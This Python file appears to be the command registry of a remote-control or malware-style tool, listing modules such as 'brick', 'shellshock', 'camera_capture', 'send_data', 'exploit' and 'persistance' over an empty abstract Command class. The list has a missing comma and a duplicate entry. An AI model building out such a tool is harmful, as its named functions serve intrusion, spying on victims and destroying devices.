from abc import ABC

# Commands must be added here to be used. Add the file name minus the ".py"
__all__ = [
    "exit",
    "send_data",
    "brick",
    "port_scan",
    "shellshock", 
    "camera_capture"
    "send_data",
    "send_email", 
    "exploit",
    "persistance"
]


class Command(ABC):
    """A command that does something"""

    def do_command(self, lines: str, *args):
        raise NotImplementedError()
